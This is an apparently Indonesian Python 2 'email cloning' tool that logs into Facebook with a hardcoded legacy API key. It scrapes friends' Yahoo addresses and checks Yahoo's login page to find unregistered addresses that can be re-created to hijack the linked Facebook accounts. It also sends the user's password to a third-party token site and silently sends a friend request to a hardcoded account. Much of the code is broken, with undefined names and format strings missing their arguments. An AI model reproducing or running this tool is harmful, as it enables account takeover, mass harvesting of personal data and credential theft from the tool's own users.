import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, platform
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

logo = """                         ______
              ______,---'__,---'
          _,-'---_---__,---'
   /_    (,  ---____',
  /  ',,   ', ,-'
 ;/)   ,',,_/,'
 | /\   ,.'//\
 '-' \ ,,'    '.
      '',   ,-- '.
      '/ / |      ',         _
      //'',.\_    .\\      ,{==>-
   __//   __;_'-  \ ';.__,;'
 ((,--,) (((,------;  '--'
 '''  '   '''
* Author : Perijoko
* Kontak : 0895701722300
* Github : https://github.com/perijoko"""


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        print logo
        id = raw_input('[+] ID|Email : ')
        pwd = raw_input('[+] Password : ')
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('config/config.json', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n[+] Login successfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(0.2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n[!] Akun kena Checkpoint'
            time.sleep(1)
            keluar()
        else:
            print '\n[!] Login Gagal'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()

def ngontol(what):
	if os.path.exists("out"):
		if os.path.exists("out/"+what+".txt"):
			if os.path.getsize("out/"+what+".txt") !=0:
				cek=raw_input('%s[!]%s file exists: out/%s%s.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,what,N,R,N)).lower()
				if cek == "y":
					open("out/"+what+".txt","w").close()
			else:open("out/"+what+".txt","w").close()
	else:
		os.mkdir("out")
		open("out/"+what+".txt","w").close()
		
class yahoo_clone:
	def __init__(self):
		self.token=""
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://graph.facebook.com/{}"
		ngontol("yahoo_vuln")
		self.toke()
	
	def maklo(self,arg,kwds):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULN%s ] %s => %s"
			open("out/yahoo_vuln.txt","a").write("%s -> %s\n")
			m.close()
		else:
			print "[ %sDIEE%s ] %s => %s"
			m.close()
		
	def toke(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed.")
		self.dump()
	
	def dump(self):
		id=[]
		for i in requests.get(self.i.format(
			"me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			
			id.append(i["id"])
		print("%s[+]%s friend: %s")
		print("%s[*]%s output: out/yahoo_vuln.txt")
		p=ThreadPool(input("%s[?]%s enter threads: "))
		p.map(self.yahoocek,id)

	def yahoocek(self,id):
		f=requests.get(
			self.i.format(
				id+"?access_token=%s"%(
					self.token))).json()
		try:
			if "yahoo.com" in f["email"]:
				self.maklo(f["email"],f["name"])

		except Exception as f:
			pass
			
class yahoo_narget:
	def __init__(self):
		self.token=""
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.i="https://graph.facebook.com/{}"
		self.toke()
		
	def maklo(self,arg,kwds):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULNERABLE YAHOO CLONE%s ]"
			open("out/yahoo_vuln.txt","a").write("%s -> %s\n")
			m.close()
		else:
			print "[ %sNOT VULNERABLE%s ] %s => %s"
			m.close()
		
	def toke(self):
		try:
			self.token=requests.get(
			bs4.BeautifulSoup(requests.post(
				"https://m.autolikeus.me/token.get.php",
			data={"username":self.config["email"],
				"password":self.config["pass"]}).text,
			features="html.parser").find(
				"iframe")["src"]).json()["access_token"]
		except:
			exit("%s[!]%s login failed.")
		self.kntl()
			
			
	def kntl(self):
		self.q=raw_input("[?] query: ").lower()
		if self.q =="":
			return self.kntl()
		self.dump()
	
	def dump(self):
		id=[]
		print 
		for i in requests.get(self.i.format(
			"me/friends?access_token=%s"%(
				self.token))).json()["data"]:
			
			if self.q in i["name"].lower():
				id.append(i["id"])
				print("%s. %s"%(
					len(id),i["name"].lower().replace(self.q,
						"%s%s%s")))
		if len(id) !=0:
			self.num(id)
		else:
			print("%s[!]%s no result for: %s")
			return self.kntl()
		
	def num(self,id):
		try:
			self.p=input("\n%s[?]%s select number: ")
		except Exception as f:
			print("%s[!]%s %s")
			return self.num(id)
		self.yahoocek(id[self.p-1])

	def yahoocek(self,id):
		self.f=requests.get(
			self.i.format(
				id+"?access_token=%s"%(
					self.token))).json()
		try:
			if "yahoo.com" in self.f["email"]:
				print("[*] name : %s"%(self.f["name"]))
				print("[*] email: %s"%(self.f["email"]))
				print("[*] checking ...")
				self.maklo(self.f["email"],self.f["name"])
				pg=raw_input("[?] retry? y/n): ")
				if pg == "y":
					return self.kntl()
			else:
				print("[*] name : %s"%(self.f["name"]))
				print("[*] email: %s"%(self.f["email"]))
				print("[*] unknown email.")
				pg=raw_input("[?] retry? y/n): ")
				if pg == "y":
					return self.kntl()
		except:
			print("[*] name : %s"%(self.f["name"]))
			print("[*] unknown email.")
			pg=raw_input("[?] retry? y/n): ")
			if pg == "y":
				return self.kntl()

class dump_yahoo(object):
	def __init__(self):
		self.fl=[]
		self.found=[]
		self.cout=0
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.token=self.gentok(self.config["email"],
			self.config["pass"])
		print("%s[*]%s yahoo dumpper from: %s friendlists"%(
			G,N,self.config["name"]))
		for i in requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(self.token)).json()["data"]:
			self.fl.append(i["id"])
		self.thread()
		
	def thread(self):
		try:
			self.l=ThreadPool(input("%s[?]%s Thread: "))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.thread()
		self.res()
	
	def res(self):
		try:
			self.aa=raw_input("%s[?]%s result file name: ")
			if self.aa =="":
				self.res()
			open("out/%s"%(self.aa),"w")
		except Exception as e:
			print "%s[!]%s %s"
			self.res()
		print "%s[*]%s output saved: out/%s"%(self.aa)
		self.l.map(self.crack,self.fl)
		print "\n[+] finished with output: out/%s"%(self.aa)
		ins()
		
	def gentok(self,email,pas):
		try:
			return requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(email,pas)).json()["access_token"]
		except:
			exit("%s[!]%s failed generate token.")
			
	def crack(self,email):
		self.cout+=1
		print "\r%s[*]%s Dumping Mailist %s/%s Written Success:-%s"%(G,N,self.cout,len(self.fl),len(self.found)),;sys.stdout.flush()
		try:
			s=requests.get("https://graph.facebook.com/%s?access_token=%s"%(email,self.token)).json()
			if "yahoo.com" in s["email"]:
				self.found.append(s["email"])
				open("out/%s"%(self.aa),"a").write("%s\n"%(s["email"]))
				
		except:pass
		
class yah(object):
	def __init__(self):
		self.mail()
		
	def mail(self):
		try:
			self.a=open(raw_input("%s[?]%s mailist: ")).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(G,N,e)
			self.mail()
		print "%s[*]%s mailist count: %s"%(G,N,len(self.a))
		self.thread()
	
	def thread(self):
		try:
			i=input("%s[?]%s Thread: "%(G,N))
			if i > 10:
				print "%s[!]%s max thread 10"%(R,N)
				self.thread()
			self.t=ThreadPool(i)
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.thread()
		self.f()
	
	def f(self):
		try:
			self.s=raw_input("%s[?]%s result filename: "%(G,N))
			open("out/%s"%(self.s),"w")
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.f()
		print "%s[*]%s output: out/%s"%(G,N,self.s)
		self.t.map(self.maklo,self.a)
		print "\n[+] finished."
		ins()
		
	def maklo(self,arg):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]="%s"%(arg)
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULN%s ]: %s"%(G,N,arg)
			open("out/%s"%(self.s),"a").write("%s\n"%(arg))
			m.close()
		else:
			print "[ %sDIEE%s ]: %s"%(R,N,arg)
			m.close()

		
class logs(object):
	def __init__(self):
		self.token=""
		self.count=0
		self.fo=[]
		config=open("config/config.json").read()
		self.config=json.loads(config)
		z=token.token("%s|%s"%(self.config["email"],self.config["pass"]))
		if z !=False:
			if os.path.exists("out"):
				self.token=z
				self.id()
			else:
				os.mkdir("out")
				self.id()
		else:exit("%s[!]%s login failed."%(R,N))
		
	def id(self):
		try:
			self.a=open(raw_input("%s[?]%s List ID: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.id()
		self.t()
		
	def t(self):
		try:
			self.th=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.t()
		self.fileno()
	
	def fileno(self):
		try:
			self.s=raw_input("%s[?]%s result filename: "%(G,N))
			if self.s =="":
				self.fileno()
			else:open("out/%s"%(self.s),"w").close()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.fileno()
		print "%s[!]%s checking email from %s id"%(G,N,len(self.a))
		print "%s[*]%s Output: out/%s"%(G,N,self.s)
		print 
		self.th.map(self.cek,self.a)
		ins()
		
	
	def cek(self,email):
		self.count+=1
		try:
			s=requests.get("https://graph.facebook.com/%s?access_token=%s"%(email,self.token)).json()
			z=s["email"]
			if "yahoo.com" in z:
				self.fo.append(z)
				open("out/%s"%(self.s),"a").write("%s\n"%(z))
				print "[+] %s -> https://mbasic.facebook.com/%s                     "%(z,s["id"])
		except Exception as e:
			pass
		#print "\r[+] Checking %s/%s - Found-: %s%s%s"%(self.count,len(self.a),G,len(self.fo),N),;sys.stdout.flush()
		
		
		
def clone():
	r = raw_input('\n[+] Actions>> ')
	if r =="1" or r =="01":
		yahoo_clone()
	elif r =="2" or r =="02":
		yahoo_narget()
	elif r =="3" or r =="03":
		yah()
	elif r =="4" or r =="04":
		dump_yahoo()
	elif r =="5" or r =="05":
		logs()
	elif r =="6" or r =="06":
		ins()
	else:
		print("[!] invalid options")
		clone()

def menu():
	print("\t[ Select Actions ]\n")
	print("  {01} Mass Check")
	print("  {02} Narget")
	print("  {03} Single yahoo checker from mailist")
	print("  {0s} Dumps Yahoo Mail Only From Friendlists.")
	print("  {05} Dumps Yahoo Mail Only From ID LIST")
	print("  {06} Back To Menu Options")
	clone()
	
if __name__ == "__main__":
	try:
		print "\t* Author: Kelprmdhni"
		print "\t* Github: https://github.com/kelprmdhni"
		print "\t* Tools : Email Cloning"
		print "-"*45+"\n"
		login()
	except (EOFError,KeyboardInterrupt):
		exit("\n[!] KeyboardInterrupt: Keluar.")
